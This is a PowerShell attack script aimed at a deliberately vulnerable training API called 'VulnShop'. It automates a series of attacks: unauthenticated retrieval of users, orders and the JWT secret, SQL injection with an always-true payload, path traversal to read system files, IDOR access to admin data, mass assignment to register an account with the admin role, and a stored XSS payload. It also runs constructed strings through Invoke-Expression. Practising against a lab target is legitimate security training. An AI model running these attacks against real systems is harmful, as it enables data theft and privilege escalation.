# Comprehensive, non-destructive attack script for VulnShop API (PowerShell)
# This script tests for sensitive data exposure, lack of authentication,
# and other OWASP Top 10 vulnerabilities.

param(
    [Parameter(Mandatory=$true, HelpMessage="The base URL of the VulnShop API to target.")]
    [string]$ApiBaseUrl
)


# --- Configuration ---
Write-Host "Targeting API at: $ApiBaseUrl"
Write-Host "---"

# --- Helper Functions ---
function Print-Header($title) {
    Write-Host "`n`n==================================================" -ForegroundColor Yellow
    Write-Host "  $title" -ForegroundColor Yellow
    Write-Host "==================================================`n" -ForegroundColor Yellow
}

function Run-Test($testName, $command) {
    Write-Host "--- Starting Test: $testName ---" -ForegroundColor Cyan
    try {
        # Replace the placeholder with the actual ApiBaseUrl
        $resolvedCommand = $command.Replace('$API_BASE_URL', $ApiBaseUrl)
        Invoke-Expression $resolvedCommand | ConvertTo-Json -Depth 10
    } catch {
        Write-Host "Error running test: $_" -ForegroundColor Red
    }
    Write-Host "`n--- Test Complete: $testName ---`n" -ForegroundColor Cyan
    Start-Sleep -Seconds 1
}

# --- Attack Scenarios ---

# 1. Lack of Authentication & Information Disclosure
Print-Header "Testing Public Endpoints (No Authentication Required)"

Run-Test "Discover API Endpoints" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/discovery' -Method Get"

Run-Test "Fetch All Users (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/users' -Method Get).users[0]"

Run-Test "Fetch System Information (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/system-info' -Method Get).system.env.JWT_SECRET"

Run-Test "Fetch Database Schema (Sensitive Data Exposure)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/db-schema' -Method Get"

Run-Test "Fetch Recent Orders (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/recent-orders' -Method Get).orders[0]"

Run-Test "Fetch App Configuration (Exposing JWT Secret)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/config' -Method Get"

Run-Test "Fetch Debug Information" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/debug' -Method Get).routes[0]"

# 2. Injection Attacks
Print-Header "Testing Injection Vulnerabilities"

Run-Test "SQL Injection - User Search (Bypass Auth)" `
    "Invoke-RestMethod -Uri \"$ApiBaseUrl/api/public/user-search?username=' OR '1'='1' --\" -Method Get"

Run-Test "SQL Injection - Product Search (Error-Based)" `
    "Invoke-RestMethod -Uri \"$ApiBaseUrl/api/products/search?q='\" -Method Get"

# 3. Path Traversal
Print-Header "Testing Path Traversal"

Run-Test "Attempt to Read hosts file" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/files?path=C:\Windows\System32\drivers\etc\hosts' -Method Get"

Run-Test "Attempt to Read package.json" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/files?path=./package.json' -Method Get"

# 4. Broken Authentication & Access Control
Print-Header "Testing Authentication and Access Control"

$registerPayload = @{
    username = "attacker_ps"
    email    = "attacker_ps@test.com"
    password = "password123"
} | ConvertTo-Json

Run-Test "Register a New User" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/register' -Method Post -Body '$registerPayload' -ContentType 'application/json'"

$loginPayload = @{
    username = "attacker_ps"
    password = "password123"
} | ConvertTo-Json

$tokenResponse = Invoke-RestMethod -Uri "$ApiBaseUrl/api/login" -Method Post -Body $loginPayload -ContentType "application/json"
$TOKEN = $tokenResponse.token

if (-not $TOKEN) {
    Write-Host "Failed to get token for attacker. Exiting." -ForegroundColor Red
    exit 1
}
Write-Host "Successfully logged in as 'attacker_ps'"

$headers = @{ "Authorization" = "Bearer $TOKEN" }

Run-Test "Attempt IDOR to Access Admin's Order (Order ID 1)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/orders/1' -Method Get -Headers \$headers"

Run-Test "Attempt to Export Admin's Data (User ID 1)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/users/1/export' -Method Get -Headers \$headers"

# 5. Mass Assignment
Print-Header "Testing Mass Assignment Vulnerability"

$adminRegisterPayload = @{
    username = "eviladmin_ps"
    email    = "evil_ps@test.com"
    password = "password123"
    role     = "admin"
} | ConvertTo-Json

Run-Test "Register New User with Admin Role" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/register' -Method Post -Body '$adminRegisterPayload' -ContentType 'application/json'"

$adminLoginPayload = @{
    username = "eviladmin_ps"
    password = "password123"
} | ConvertTo-Json

$adminTokenResponse = Invoke-RestMethod -Uri "$ApiBaseUrl/api/login" -Method Post -Body $adminLoginPayload -ContentType "application/json"
$ADMIN_TOKEN = $adminTokenResponse.token

if (-not $ADMIN_TOKEN) {
    Write-Host "Failed to get token for eviladmin_ps. Test may have failed." -ForegroundColor Red
} else {
    Write-Host "Successfully logged in as 'eviladmin_ps' - mass assignment likely successful!"
    $adminHeaders = @{ "Authorization" = "Bearer $ADMIN_TOKEN" }
    Run-Test "Verify Admin Access by Fetching All Users" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/admin/users' -Method Get -Headers \$adminHeaders"
}

# 6. Cross-Site Scripting (XSS)
Print-Header "Testing XSS in Product Reviews"

$xssPayload = @{
    rating  = 5
    comment = "<script>alert('XSS')</script>"
} | ConvertTo-Json

Run-Test "Submit Review with XSS Payload" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1/reviews' -Method Post -Headers \$headers -Body '$xssPayload' -ContentType 'application/json'"

Run-Test "Verify XSS Payload is Stored" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1' -Method Get"

Write-Host "`n`n==================================================" -ForegroundColor Green
Write-Host "  All non-destructive attacks completed." -ForegroundColor Green
Write-Host "==================================================`n" -ForegroundColor Green 